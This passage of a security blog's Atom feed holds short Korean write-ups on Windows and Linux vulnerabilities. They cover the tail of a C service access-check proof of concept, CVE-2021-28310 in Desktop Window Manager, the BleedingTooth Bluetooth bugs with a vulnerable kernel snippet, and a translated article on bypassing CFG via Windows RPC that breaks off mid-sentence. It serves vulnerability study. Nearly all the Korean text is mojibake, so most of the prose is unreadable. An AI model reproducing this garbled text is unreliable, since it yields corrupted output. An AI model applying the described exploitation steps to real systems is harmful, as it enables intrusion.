class="hljs-string">&quot;[ERROR]: Got access denied error.\\n&quot;</span>);            <span class="hljs-keyword">break</span>;        case ERROR_SUCCESS:            printf(<span class="hljs-string">&quot;[SUCCESS]: Successfully started service.\\n&quot;</span>);            <span class="hljs-keyword">break</span>;        case ERROR_SERVICE_DISABLED:            printf(<span class="hljs-string">&quot;[SUCCESS]: Service was disabled but passed the access check.\\n&quot;</span>);            <span class="hljs-keyword">break</span>;        default:            printf(<span class="hljs-string">&quot;[WARNING]: Didn&#x27;t start service but didn&#x27;t get back expected error:%d\\n&quot;</span>, error);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>insu</tag>
      
      <tag>bypass</tag>
      
      <tag>scm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-28310: Desktop Window Manager out-of-bound write ì·¨ì•½ì </title>
    <link href="/2021/04/15/idioth/2021-04-15/"/>
    <url>/2021/04/15/idioth/2021-04-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securelist.com/zero-day-vulnerability-in-desktop-window-manager-cve-2021-28310-used-in-the-wild/101898/">Zero-day vulnerability in Desktop Window Manager (CVE-2021-28310) used in the wild</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows OS ë¹Œë“œ 19041.928 ì´í•˜ ë²„ì „</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows ë°ìŠ¤í¬í†± ì°½ ê´€ë¦¬ì(Desktop Window Manager, <code>dwm.exe</code>)ì˜ <code>dwmcore.dll</code>ì—ì„œ out-of-bounds write ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. í•´ì»¤ëŠ” DirectComposition APIë¥¼ ì‚¬ìš©í•˜ì—¬ ì˜¤í”„ì…‹ì„ ì¡°ì‘í•˜ì—¬ ë°ì´í„°ë¥¼ ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><a href="https://docs.microsoft.com/en-us/windows/win32/directcomp/directcomposition-portal">DirectComposition</a>ì€ ë‹¤ì–‘í•œ ì†ŒìŠ¤(GDI, DirectX ë“±)ì˜ ë¹„íŠ¸ë§µì„ ì§€ì›í•˜ëŠ” ë³€í™˜, íš¨ê³¼, ì• ë‹ˆë©”ì´ì…˜ ë¹„íŠ¸ë§µ êµ¬ì„±ì„ ìœ„í•´ Windows 8ì—ì„œ ë„ì…ëœ Windows êµ¬ì„± ìš”ì†Œì…ë‹ˆë‹¤. DirectComposition APIëŠ” <code>win32kbase.sys</code> ë“œë¼ì´ë²„ì— êµ¬í˜„ë˜ì–´ ìˆìœ¼ë©° ê´€ë ¨ëœ syscallì€ <code>NtDComposition</code>ìœ¼ë¡œ ì‹œì‘í•©ë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•˜ê¸° ìœ„í•´ì„œ 3ê°œì˜ syscallì´ í•„ìš”í•©ë‹ˆë‹¤. <code>NtDCompositionCreateChannel</code>ì€ <code>NtDCompositionProcessChannelBatchBuffer</code>ì™€ í•¨ê»˜ ì±„ë„ì„ ì´ˆê¸°í™”í•˜ì—¬ kernel batch modeì—ì„œ ì²˜ë¦¬ë˜ë„ë¡ ì—¬ëŸ¬ ê°œì˜ DirectCompositionì„ ì „ì†¡í•©ë‹ˆë‹¤. ì»¤ë„ì— ì˜í•´ ëª…ë ¹ì–´ê°€ ì²˜ë¦¬ë˜ì§€ë§Œ ëª…ë ¹ì–´ë“¤ì€ ë‹¤ë¥¸ í¬ë§·ìœ¼ë¡œ serialize ë˜ì–´ Local Procedure Call(LPC) í”„ë¡œí† ì½œì—ì„œ Desktop Window Manager(<code>dwm.exe</code>)ë¡œ ì „ë‹¬ë˜ê³  í™”ë©´ì— ì¶œë ¥ë©ë‹ˆë‹¤. ì´ í”„ë¡œì‹œì €ëŠ” <code>NtDCompositionCommitChannel</code>ì— ì˜í•´ ì´ˆê¸°í™”ë©ë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•˜ê¸° ìœ„í•´ì„œëŠ” 3ê°€ì§€ ëª…ë ¹ì–´(<code>CreateResource</code>, <code>ReleaseResource</code>, <code>SetResourceBufferProperty</code>)ë¥¼ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤. <code>dwmcore.dll</code>ì˜ <code>CPropertySet::ProcessSetPropertyValue</code> í•¨ìˆ˜ëŠ” <code>SetResourceBufferProperty</code>ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. D2DVector2ë¡œ expression typeì´ ì„¤ì •ëœ <code>SetResourceBufferProperty</code>ì˜ ê²½ìš° <code>CPropertySet::ProcessSetPropertyValue</code>ì—ì„œ ì—…ë°ì´íŠ¸ ì—¬ë¶€ì— ë”°ë¼ <code>CPropertySet::AddProperty&lt;D2DVector2&gt;</code> í˜¹ì€ <code>CPropertySet::UpdateProperty&lt;D2DVector2&gt;</code>ë¥¼ í˜¸ì¶œí•˜ì—¬ ëª…ë ¹ì–´ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤. ì´ë•Œ <code>UpdateProperty</code>ì—ì„œ <code>propertyId</code>ê°€ ë¦¬ì†ŒìŠ¤ì— ì¶”ê°€ëœ property ìˆ˜ë³´ë‹¤ ì‘ì€ì§€ í™•ì¸í•˜ì§€ ì•Šì•„ property ë°°ì—´ ë‚´ë¶€ ë°ì´í„°ì— ëŒ€í•œ ë‘ ê°€ì§€ ê²€ì‚¬ë¥¼ ìš°íšŒí•˜ë©´ <code>propertiesData</code> ë²„í¼ë¥¼ ì§€ë‚˜ OOB writeê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. í•´ì»¤ê°€ <code>dwm.exe</code> í”„ë¡œì„¸ìŠ¤ì—ì„œ ê°ì²´ë¥¼ í• ë‹¹í•˜ê³  í•´ì œí•  ìˆ˜ ìˆìœ¼ë©´ heap sprayë¥¼ í†µí•´ ì´ ê²€ì‚¬ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ê²€ì‚¬ë¥¼ ìš°íšŒí•œ í›„ ì¡°ì‘ëœ <code>propertyId</code>ë¡œ ëª…ë ¹ì„ ì „ì†¡í•˜ë©´ <code>NtDCompositionProcessChannelBatchBuffer</code>ì—ì„œ ì—ëŸ¬ë¥¼ ë°˜í™˜í•˜ê³  ëª…ë ¹ì–´ê°€ <code>dwm.exe</code>ì— ì „ì†¡ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. kernel mode <code>UpdateProperty&lt;D2DVector2&gt;</code>ì˜ <code>propertiesCount</code> ê²€ì‚¬ëŠ” user modeì—ì„œì˜ ì•…ì„± ëª…ë ¹ ì‹¤í–‰ì„ ë°©ì§€í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ kernel mode <code>AddProperty</code>ëŠ” user modeì™€ ìœ ì‚¬í•˜ê²Œ ì‘ë™í•˜ë©° ìƒì„±ëœ propertyì˜ <code>propertyId</code>ì™€ <code>storageOffset</code>ì´ ì œê³µëœ ê°’ê³¼ ë™ì¼í•œì§€ë§Œ í™•ì¸í•˜ê³  ë‹¤ë¥´ë©´ ì—ëŸ¬ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤. <code>AddProperty</code>ë¥¼ í†µí•´ ìƒˆ ì†ì„±ì„ ì¶”ê°€í•˜ì—¬ í•¨ìˆ˜ê°€ ì—ëŸ¬ë¥¼ ë°˜í™˜í•˜ë©´ kernel modeì™€ user mode ë™ì¼ ë¦¬ì†ŒìŠ¤ ê°„ì— property ìˆ˜ì˜ ë¶ˆì¼ì¹˜ê°€ ë°œìƒí•˜ì—¬ kernel mode <code>propertiesCount</code> ê²€ì‚¬ë¥¼ ìš°íšŒí•˜ì—¬ <code>dwm.exe</code>ì—ì„œ ëª…ë ¹ì–´ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>idioth</tag>
      
      <tag>oob write</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] BleedingTooth: Zero-Click RCE</title>
    <link href="/2021/04/14/fabu1ous/2021-04-14/"/>
    <url>/2021/04/14/fabu1ous/2021-04-14/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup">BleedingTooth: Linux Bluetooth Zero-Click RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Linux kernel 4.19 (with Bluetooth 5)</p><p>Linux kernel &lt;= 3.6</p><p>Linux kernel &gt;= 4.8</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>BleedingToothë¼ ë¶ˆë¦¬ëŠ” ì·¨ì•½ì  3ê°œì˜ Write-upì´ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤. BleedingToothëŠ” Linux Bluetooth subsystemì˜ ì œë¡œ í´ë¦­ ì·¨ì•½ì ë“¤ë¡œ, í•´ì»¤ëŠ” ì´ë¥¼ ì•…ìš©í•´ ì·¨ì•½í•œ ì‹œìŠ¤í…œì—ì„œ ì»¤ë„ ê¶Œí•œìœ¼ë¡œ ì›ê²© ì½”ë“œ ì‹¤í–‰ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì£¼ë¡œ ë¸”ë£¨íˆ¬ìŠ¤ ì·¨ì•½ì ë“¤ì˜ ì˜í–¥ì€ íŒì›¨ì–´ ì„ ì— ë¨¸ë¬¼ê±°ë‚˜ ë°ì´í„° ë„ì²­ ë° ì¡°ì‘ì— ë¨¸ë¬´ëŠ” ë°˜ë©´ BleedingToothëŠ” ê¸°ê¸° ì „ì²´ë¥¼ ì™„ì „íˆ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ul><li><p>BadVibes(CVE-2020-24490) Heap-based Buffer Overflow</p><p>ê¸°ì¡´ 31 bytes ì˜€ë˜  <a href="https://www.silabs.com/community/wireless/bluetooth/knowledge-base.entry.html/2017/02/10/bluetooth_advertisin-hGsf">Advertising data</a>ì˜ í¬ê¸°ê°€ ë¸”ë£¨íˆ¬ìŠ¤5ì—ì„  255 bytesê¹Œì§€ í™•ì¥ë˜ì—ˆìŠµë‹ˆë‹¤. ê·¸ì— ë§ì¶° 255 bytesê¹Œì§€ í™•ì¥ëœ Advertisement reportë¥¼ íŒŒì‹± í•˜ëŠ” í•¨ìˆ˜ <code>hci_le_ext_adv_report()</code>ê°€ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤. ë‹¤ë§Œ ê¸°ì¡´<code>hci_le_adv_report()</code>ì— ì¡´ì¬í•˜ë˜ size checkê°€ í•´ë‹¹ í•¨ìˆ˜ì—ëŠ” ì—†ê¸° ë•Œë¬¸ì— overflowê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p></li></ul><ul><li><p>BadChoice(CVE-2020-12352) Stack-Based Information Leak</p><p>A2MP í”„ë¡œí† ì½œì˜ <code>A2MP_GETINFO_REQ</code> ì»¤ë©˜ë“œë¡œ í˜¸ì¶œë˜ëŠ” <code>a2mp_getinfo_req()</code>ëŠ” HCI device idë¥¼ ì‚¬ìš© ì¤‘ì¸ AMPì»¨íŠ¸ë¡¤ëŸ¬ì˜ ì •ë³´ë¥¼ ìš”ì²­í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ, ë§Œì•½ <code>HCI_AMP</code>ê°€ ìœ íš¨í•˜ì§€ ì•Šë‹¤ë©´ requestë¥¼ ë°›ì€ íƒ€ê²Ÿ ì‹œìŠ¤í…œì€  <code>A2MP_STATUS_INVALID_CTRL_ID</code>ë¥¼ ì‘ë‹µí•©ë‹ˆë‹¤.  ì´ ë•Œ ì´ˆê¸°í™” ì™„ì „íˆ ì´ë£¨ì–´ì§€ì§€ ì•Šì€ íƒ“ì— <code>A2MP_STATUS_INVALID_CTRL_ID</code>ê°€ 16 bytesì˜ ì»¤ë„ ìŠ¤íƒ ë°ì´í„°ë¥¼ í¬í•¨í•œ ì±„ë¡œ í•´ì»¤ì—ê²Œ ì „ë‹¬ë©ë‹ˆë‹¤.</p></li></ul><ul><li><p>BadKarma: Heap-Based Type Confusion (CVE-2020-12351)</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">l2cap_data_rcv</span><span class="hljs-params">(struct l2cap_chan *chan, struct sk_buff *skb)</span></span><span class="hljs-function"></span>&#123;...<span class="hljs-keyword">if</span> ((chan-&gt;mode == L2CAP_MODE_ERTM ||     chan-&gt;mode == L2CAP_MODE_STREAMING) &amp;&amp; sk_filter(chan-&gt;data, skb))<span class="hljs-keyword">goto</span> drop;...&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> struct amp_mgr *<span class="hljs-title">amp_mgr_create</span><span class="hljs-params">(struct l2cap_conn *conn, <span class="hljs-keyword">bool</span> locked)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">amp_mgr</span> *<span class="hljs-title">mgr</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">l2cap_chan</span> *<span class="hljs-title">chan</span>;</span>mgr = kzalloc(<span class="hljs-keyword">sizeof</span>(*mgr), GFP_KERNEL);<span class="hljs-keyword">if</span> (!mgr)<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;...chan = a2mp_chan_open(conn, locked);<span class="hljs-keyword">if</span> (!chan) &#123;kfree(mgr);<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;&#125;mgr-&gt;a2mp_chan = chan;chan-&gt;data = mgr;...<span class="hljs-keyword">return</span> mgr;&#125;</code></pre><p>í•¨ìˆ˜ <code>sk_filter()</code>ëŠ” <code>struct sock</code>ë¥¼ ì²˜ë¦¬í•˜ëŠ” ë°˜ë©´, argumentë¡œ ì „ë‹¬ë˜ëŠ” <code>chan-&gt;data</code>ì˜ íƒ€ì…ì€ <code>struct amp_mgr</code>ì…ë‹ˆë‹¤. ë”°ë¼ì„œ remote type confusion ì·¨ì•½ì ì…ë‹ˆë‹¤. </p></li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>zero click</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Exploit Windows RPC to bypass CFG mitigation</title>
    <link href="/2021/04/14/fabu1ous/cfg-bypass/"/>
    <url>/2021/04/14/fabu1ous/cfg-bypass/</url>
    
    <content type="html"><![CDATA[<h1 id="ë²ˆì—­-ì¶”ì‹ "><a href="#ë²ˆì—­-ì¶”ì‹ " class="headerlink" title="ë²ˆì—­ ì¶”ì‹ "></a>ë²ˆì—­ ì¶”ì‹ </h1><p>Hackyboiz ë¸”ë¡œê·¸ ìš´ì˜ ì´ˆë°˜ì— CFGì™€ XFGì— ëŒ€í•œ ì—°êµ¬ê¸€ì„ ì‘ì„±í•˜ê³  ìˆì—ˆìŠµë‹ˆë‹¤. CFG Bitmap ìƒì„± ë¶€ë¶„ì„ ê³µë¶€í•˜ë‹¤ê°€ ë¨¸ë¦¬ê°€ ë»ê·¼í•´ì„œ ì ì‹œ ë©ˆì¶˜ë‹¤ëŠ” ê²Œ ì•„ì˜ˆ ë¬´ì‚°ë˜ë²„ë ¸ë„¤ìš”. ì—°êµ¬íŒ€ í˜•ë‹˜ í•œë¶„ê»˜ì„œ í•´ë‹¹ ê¸€ì„ ì‘ì„±í•˜ë˜ ì €ë¥¼ ë³´ì‹œê³¤ â€œë©”ëª¨ë¦¬ ì»¤ëŸ½ì…˜ì€ ì´ì œ ì–´ë–»ê²Œ í•˜ëƒ ã…‹ã…‹ã…‹?â€ ì´ëŸ° ë§ì”€ì„ í•˜ì…¨ì£ . ê·¸ë˜ì„œ CFG bypassë¼ëŠ” ì œëª©ì˜ ê¸€ì„ ê·¸ëƒ¥ ì§€ë‚˜ì¹  ìˆ˜ê°€ ì—†ë”êµ°ìš”. ì´ëŸ° ì´ìœ ë¡œ ì´ë²ˆì— ì½ì€ ê¸€ í•˜ë‚˜ ë²ˆì—­í•´ì„œ ì˜¬ë¦½ë‹ˆë‹¤.</p><p><a href="https://iamelli0t.github.io/2021/04/10/RPC-Bypass-CFG.html">ì›ë¬¸: Exploiting Windows RPC to bypass CFG mitigation</a></p><h1 id="ë¨¸ë¦¿ë§"><a href="#ë¨¸ë¦¿ë§" class="headerlink" title="ë¨¸ë¦¿ë§"></a>ë¨¸ë¦¿ë§</h1><p>ë¸Œë¼ìš°ì € ë Œë” í”„ë¡œì„¸ìŠ¤ ìµìŠ¤í”Œë¡œì‡ì˜ ë³´í¸ì ì¸ ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. ì·¨ì•½ì ì„ ê³µê²©í•˜ì—¬ ë©”ëª¨ë¦¬ì— ëŒ€í•œ ì„ì˜ì˜ ìœ ì € ëª¨ë“œ ì½ê¸°/ì“°ê¸° ê¶Œí•œì„ ê°€ì ¸ì˜¨ í›„ execution flowë¥¼ íƒˆì·¨í•˜ê¸° ìœ„í•´ DOM/js ê°ì²´ì˜ vtableì„ ë³€ì¡°í•©ë‹ˆë‹¤. ê·¸ë‹¤ìŒ ROP chainì— ì˜í•´ í˜¸ì¶œëœ VirtualProtectê°€ ì‰˜ ì½”ë“œ ë©”ëª¨ë¦¬ë¥¼ PAGE_EXECUTE_READWITEë¡œ ìˆ˜ì •í•˜ê³  execution flowê°€ ìµœì¢…ì ìœ¼ë¡œ ì‰˜ ì½”ë“œë¡œ ì´ë™í•©ë‹ˆë‹¤. Windows 8.1 ì´í›„ë¡œ MicrosoftëŠ” CFG(Control Flow Guard) ë³´í˜¸ ê¸°ë²•ì„ ë„ì…í•˜ì—¬ indirect function call(vtableì„ ì°¸ì¡°í•˜ëŠ” í•¨ìˆ˜ í˜¸ì¶œ ë°©ì‹)ì„ í™œìš©í•œ vtable overwrite ê³µê²©ì„ ê°ì§€ ë° ë°©ì§€í•˜ê³  ìˆìŠµë‹ˆë‹¤.</p><p>í•˜ì§€ë§Œ, ì—¬ê¸°ì„œ ëë‚˜ë©´ ì„­ì„­í•˜ì£ . CFG ë³´í˜¸ ê¸°ë²•ì„ ìš°íšŒí•˜ëŠ” ìƒˆë¡œìš´ ë°©ë²•ì´ ë“±ì¥í–ˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ chackra/jscript9ì—ì„œëŠ” ìŠ¤íƒì˜ ë¦¬í„´ ì£¼ì†Œë¥¼ ë³€ì¡°í•˜ì—¬ code execution flowë¥¼ ê°€ë¡œì±„ê³ , v8ì˜ ê²½ìš°ì—ëŠ” ì‹¤í–‰ ê°€ëŠ¥í•œ ë©”ëª¨ë¦¬ ì†ì„±ì´ ìˆëŠ” WebAssemblyë¥¼ ì‚¬ìš©í•´ ì‰˜ ì½”ë“œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. 2020ë…„ 12ì›”, MicrosoftëŠ” Intel Tiger Lake CPUë¥¼ ê¸°ë°˜ìœ¼ë¡œ í•œ CET(Control-flow Enforcement Technology) ë³´í˜¸ ê¸°ë²•ì„ Windows1020H1ì— ë„ì…í–ˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ CET í™˜ê²½ì—ì„œ CFGë¥¼ ìš°íšŒí•˜ëŠ” ë°©ë²•ì€ ì·¨ì•½ì  ìµìŠ¤í”Œë¡œì‡ì˜ ìƒˆë¡œìš´ ë¬¸ì œê°€ ëìŠµë‹ˆë‹¤.</p><p>ì €í¬ëŠ” ì‹¤ì œ ê³µê²©ì— ì‚¬ìš©ëœ <a href="https://hackyboiz.github.io/2021/03/26/l0ch/2021-03-26/">CVE-2021-26411</a>ì˜ ìƒ˜í”Œì„ ë¶„ì„í•˜ë˜ ì¤‘ Windows RPC(Remote Procdure Call)ë¥¼ ì‚¬ìš©í•˜ì—¬ CFG ë³´í˜¸ ê¸°ë²•ì„ ìš°íšŒí•˜ëŠ” ìƒˆë¡œìš´ ë°©ë²•ì„ ë°œê²¬í–ˆìŠµë‹ˆë‹¤. ì´ ë°©ë²•ì€ ROP chainì— ì˜ì¡´í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ê°€ì§œ RPC_MESSAGEë¥¼ êµ¬ì„±í•˜ëŠ” ê²ƒìœ¼ë¡œ rpcrt4!NdrServerCall2ë¥¼ ìˆ˜ë™ìœ¼ë¡œ í˜¸ì¶œí•˜ì—¬ ì„ì˜ ì½”ë“œ ì‹¤í–‰(Arbitrary Code Execution)ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h1 id="CVE-2021-25411"><a href="#CVE-2021-25411" class="headerlink" title="CVE-2021-25411"></a>CVE-2021-25411</h1><p>ì €ì˜ ë¸”ë¡œê·¸ ê¸€ â€œ<a href="https://iamelli0t.github.io/2021/03/12/CVE-2021-26411.html">CVE-2021-26411: Internet Explorer mshtml use-after-free</a>â€œì—ì„œ root causeë¥¼ ë¶„ì„í–ˆìŠµë‹ˆë‹¤. removeAttributeNode()ëŠ” nodeValueì˜ valueOf ì½œë°±ì„ íŠ¸ë¦¬ê±°í•©ë‹ˆë‹¤. ì½œë°± ì¤‘ì— clearAttributes()ê°€ ìˆ˜ë™ìœ¼ë¡œ í˜¸ì¶œë˜ì–´ nodeValueì— ì €ì¥ëœ BSTRë¥¼ ë¯¸ë¦¬ í•´ì œí•©ë‹ˆë‹¤. ì½œë°± ê°’ì´ ë°˜í™˜ëœ í›„ nodeValue ê°ì²´ê°€ ìˆëŠ” ê²½ìš° UAF(Use-After-Free)ê°€ ë°œìƒí•©ë‹ˆë‹¤.</p><p>Windows 3ì›” íŒ¨ì¹˜ì—ì„œ í•´ë‹¹ ì·¨ì•½ì ì„ ìˆ˜ì •í•˜ê¸° ìœ„í•´ CAttrArray::Destroyí•¨ìˆ˜ì— ê°ì²´ë¥¼ ì‚­ì œí•˜ê¸° ì „ì— ì¸ë±ìŠ¤ë¥¼ ê²€ì‚¬í•˜ëŠ” ì½”ë“œë¥¼ ì¶”ê°€í–ˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/1.png"></p><p>ë©”ëª¨ë¦¬ í¬ê¸°ë¥¼ ì œì–´í•  ìˆ˜ ìˆëŠ” UAF ì·¨ì•½ì ì˜ ê²½ìš°, ì„œë¡œ ë‹¤ë¥¸ typeì˜ í¬ì¸í„°(BSTRê³¼ Dictionary.item)ê°€ ì¬ì‚¬ìš© ë©”ëª¨ë¦¬ë¥¼ ê°€ë¦¬í‚¤ê²Œ í•˜ì—¬ type confusionì— ì˜í•œ í¬ì¸í„° ë…¸ì¶œ ë° í¬ì¸í„° ì°¸ì¡° í•´ì œë¥¼ ë‹¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/2.png"></p><h1 id="Windows-RPC-introduction-and-exploitation"><a href="#Windows-RPC-introduction-and-exploitation" class="headerlink" title="Windows RPC introduction and exploitation"></a>Windows RPC introduction and exploitation</h1><p>Windows RPCëŠ” ë¶„ì‚°ëœ í´ë¼ì´ì–¸íŠ¸/ì„œë²„ function call ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ì§€ì›í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. Windows RPCì— ì˜í•´ í´ë¼ì´ì–¸íŠ¸ëŠ” ì„œë²„ í•¨ìˆ˜ë¥¼ ë¡œì»¬ í•¨ìˆ˜ í˜¸ì¶œì¸ ê²ƒì²˜ëŸ¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ì‚¬ì§„ì€ Windows RPCì˜ ê¸°ë³¸ ì•„í‚¤í…ì²˜ì…ë‹ˆë‹¤.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/3.png"></p><p>í´ë¼ì´ì–¸íŠ¸/ì„œë²„ í”„ë¡œê·¸ë¨ì€ í˜¸ì¶œ ë§¤ê°œ ë³€ìˆ˜ í˜¹ì€ ë¦¬í„´ ê°’ì„ lower-level Stub í•¨ìˆ˜ë¡œ ì „ë‹¬í•©ë‹ˆë‹¤. Stub í•¨ìˆ˜ëŠ” NDR(Network Data Representation) í¬ë§·ìœ¼ë¡œ ë°ì´í„°ë¥¼ ìº¡ìŠí™”í•˜ëŠ” ì—­í• ì„ ë‹´ë‹¹í•©ë‹ˆë‹¤. Runtime libraryë¥¼ í†µí•œ í†µì‹ ì„ rpcrt4.dllì— ì˜í•´ ì œê³µë©ë‹ˆë‹¤.</p><p>ë‹¤ìŒì€ idl ì˜ˆì œì…ë‹ˆë‹¤.</p><pre><code class="hljs c">[uuid(<span class="hljs-string">&quot;1BC6D261-B697-47C2-AF83-8AE25922C0FF&quot;</span>),version(<span class="hljs-number">1.0</span>)]interface HelloRPC&#123;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span></span>;&#125;</code></pre><p>í´ë¼ì´ì–¸íŠ¸ê°€ add í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ë•Œ ì„œë²„ëŠ” rpcrt4.dllë¡œë¶€í„° ì²˜ë¦¬ ìš”ì²­ì„ ìˆ˜ì‹ í•˜ê³  rpcrt4!NdrServerCall2ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/4.png"></p><p>rpcrt4!NdrServerCall2ì—ëŠ” í•¨ìˆ˜ ì¸ë±ìŠ¤ ë° ë§¤ê°œ ë³€ìˆ˜ì™€ ê°™ì€ ì¤‘ìš”í•œ ë°ì´í„°ë¥¼ í¬í•¨í•œ PRPC_MESSAGEë§Œì„ ë§¤ê°œë³€ìˆ˜ë¡œ ë°›ìŠµë‹ˆë‹¤. ì„œë²„ RPC_MESSAGE êµ¬ì¡°ì²´ì™€ main sub data êµ¬ì¡°ì²´ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/5.png"></p><p>ì•ì„œ ì–¸ê¸‰í•œ ê·¸ë¦¼ê³¼ ê°™ì´, RPC_MESSAGE êµ¬ì¡°ì²´ì—ì„œ í•¨ìˆ˜ í˜¸ì¶œì— ì¤‘ìš”í•œ ë‘ ê°€ì§€ ë³€ìˆ˜ëŠ” Bufferì™€ RpcInterfaceInformationì…ë‹ˆë‹¤. BufferëŠ” í•¨ìˆ˜ì˜ ë§¤ê°œ ë³€ìˆ˜ë¥¼ ì €ì¥í•˜ê³  RpcInterfaceInformationì€ RPC_SERVER_INTERFACE êµ¬ì¡°ì²´ë¥¼ ê°€ë¦¬í‚¤ê³  ìˆìŠµë‹ˆë‹¤. RPC_SERVER_INTERFACE êµ¬ì¡°ì²´ëŠ” ì„œë²„ í”„ë¡œê·¸ë¨ ì¸í„°í˜ì´ìŠ¤ ì •ë³´ë¥¼ ë‹´ê³  ìˆëŠ”ë°, ì—¬ê¸°ì„œ DispatchTable(+0x2c)ì€ runtime libraryì™€ stub í•¨ìˆ˜ì˜ ì¸í„°í˜ì´ìŠ¤ í•¨ìˆ˜ í¬ì¸í„°ë¥¼ ì €ì¥í•˜ê³ , InterpreterInfo(+0x3c)ëŠ” MIDL_SERVER_INFOë¥¼ ê°€ë¦¬í‚µë‹ˆë‹¤. MIDL_SERVER_INFO êµ¬ì¡°ì²´ëŠ” ì„œë²„ IDL ì¸í„°í˜ì´ìŠ¤ ì •ë³´ë¥¼ ì €ì¥í•˜ê³ , DispatchTable(+0x4)ì€ ì„œë²„ ë£¨í‹´ í•¨ìˆ˜ì˜ í¬ì¸í„° ë°°ì—´ì„ ë‹´ê³  ìˆìŠµë‹ˆë‹¤.</p><p>ë‹¤ìŒì€ RPC_MESSAGE êµ¬ì¡°ì²´ì˜ ì˜ˆì œì…ë‹ˆë‹¤.</p><p>ìœ„ì—ì„œ ì œì‹œí•œ idlì— ë”°ë¥´ë©´, í´ë¼ì´ì–¸íŠ¸ê°€ add(0x111, 0x222)ë¥¼ í˜¸ì¶œí•˜ë©´ ì„œë²„ í”„ë¡œê·¸ë¨ì´ rpcrt4!NdrServerCall2ì— break í•©ë‹ˆë‹¤.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/6.png"></p><p>ë™ì  ë””ë²„ê¹…ì„ í†µí•´ ì–»ì€ ë©”ëª¨ë¦¬ ë¤í”„ë¥¼ ë³´ë©´ ìœ„ì—ì„œ ë¶„ì„í•œ RPC_MESSAGE êµ¬ì¡°ì²´ì™€ ì¼ì¹˜í•˜ë©° add í•¨ìˆ˜ëŠ” MIDL_SERVER_INFO.DispatchTableì— ì €ì¥ë˜ì–´ ìˆìŒì„ ì•Œ 